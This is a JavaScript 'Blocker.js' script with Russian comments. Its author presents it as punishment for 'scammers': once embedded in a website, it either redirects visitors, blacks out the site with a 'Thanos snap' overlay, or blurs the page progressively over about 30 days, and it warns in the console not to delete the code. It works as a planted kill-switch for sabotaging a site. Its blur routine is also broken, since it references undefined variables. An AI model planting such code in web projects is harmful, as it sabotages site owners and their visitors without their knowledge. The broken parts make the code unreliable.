/*!
 * Blocker.js
 * Made to protect against scammers
 * by Deus Notam
 * Telegram → https://t.me/d3usn0tam
 * Данный скрипт отвечает за наказание.
 */

// Массив с эффектами
const effects = {
  //redirect - редирект на redirecturl
  redirect: (redirectUrl) => {
    console.log(`Применяется эффект redirect на ${redirectUrl}`);
    window.location.replace(redirectUrl);
  },
  //thanos - поверх сайта чёрный экран с gif щелком таноса
  thanos: () => {
    console.log("Применяется эффект Thanos");
  const BlockerThanosBlackScreen = document.createElement("div");
  BlockerThanosBlackScreen.style.position = "fixed";
  BlockerThanosBlackScreen.style.top = "0";
  BlockerThanosBlackScreen.style.left = "0";
  BlockerThanosBlackScreen.style.width = "100%";
  BlockerThanosBlackScreen.style.height = "100%";
  BlockerThanosBlackScreen.style.background = "black";
  BlockerThanosBlackScreen.style.zIndex = "999999999";
  BlockerThanosBlackScreen.style.display = "flex";
  BlockerThanosBlackScreen.style.flexDirection = "column";
  BlockerThanosBlackScreen.style.alignItems = "center";
  BlockerThanosBlackScreen.style.justifyContent = "center";

  const BlockerThanosGifImage = document.createElement("img");
  BlockerThanosGifImage.src = "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExZWZ0bWRoajlyem1lbHViczd0MzU4YnlneHQ4cGRwMmhweTFsdzZjYSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/LOoaJ2lbqmduxOaZpS/giphy.gif";
  BlockerThanosGifImage.alt = "Tanos Snap";
  BlockerThanosGifImage.style.marginBottom = "20px";

  const BlockerThanosCaption = document.createElement("p");
  BlockerThanosCaption.style.color = "white";
  BlockerThanosCaption.innerText = "Упс... Произошёл щелчок Таноса - сайт исчез...";

  BlockerThanosBlackScreen.appendChild(BlockerThanosGifImage);
  BlockerThanosBlackScreen.appendChild(BlockerThanosCaption);

  document.body.appendChild(BlockerThanosBlackScreen);
  },
  blur: () => {
  // Создаем элемент canvas и добавляем его поверх всего сайта
  const BlockerBlurCanvas = document.createElement('canvas');
  BlockerBlurCanvas.width = window.innerWidth;
  BlockerBlurCanvas.height = window.innerHeight;
  BlockerBlurCanvas.style.position = 'fixed';
  BlockerBlurCanvas.style.top = '0';
  BlockerBlurCanvas.style.left = '0';
  BlockerBlurCanvas.style.pointerEvents = 'none'; // Позволяет элементу canvas игнорировать события мыши и клавиатуры
  BlockerBlurCanvas.style.zIndex = '999999999'; // Устанавливаем z-index
  document.body.appendChild(BlockerBlurCanvas);

// Получаем 2D контекст для рисования
  const BlockerBlurCtx = BlockerBlurCanvas.getContext('2d');

// Функция для применения постепенного блюра
    function applyBlur() {
        // Определяем прошедшее время с момента начала
        const currentTime = new Date();
        const elapsedTime = currentTime - DeusSiteInfo.blocker_blur_date;

        // Вычисляем процент времени, прошедшего с начала
        const percentage = Math.min(1, elapsedTime / duration);

        // Очищаем canvas
        BlockerBlurCtx.clearRect(0, 0, canvas.width, canvas.height);

        // Применяем блюр согласно проценту времени
        const blurAmount = 20 * percentage; // Максимальный блюр - 20
        BlockerBlurCtx.filter = `blur(${blurAmount}px)`;
        BlockerBlurCtx.drawImage(document.body, 0, 0, canvas.width, canvas.height);

        // Сбрасываем фильтр
        BlockerBlurCtx.filter = 'none';

        // Если еще не прошло 30 дней, повторяем
        if (percentage < 1) {
            requestAnimationFrame(applyBlur);
        }
    }

    // Начинаем анимацию
    requestAnimationFrame(applyBlur);
  },
};
    
  // Функция для проверки домена
  function checkDomain() {

    // Применение эффекта, если домен найден в списке
    const effectFunction = effects[DeusSiteInfo.blocker_effect];
    if (effectFunction) {
        effectFunction(DeusSiteInfo.blocker_redirecturl || DeusSiteInfo.blocker_date);
    }
        
    console.log(`${DeusSiteInfo.blocker_note}, поэтому будь осторожен и не удаляй этот код. По всем вопросам пиши сюда \nTelegram Group → https://t.me/d3usn0tam`);
  }

// Вызов функции для проверки домена
checkDomain();
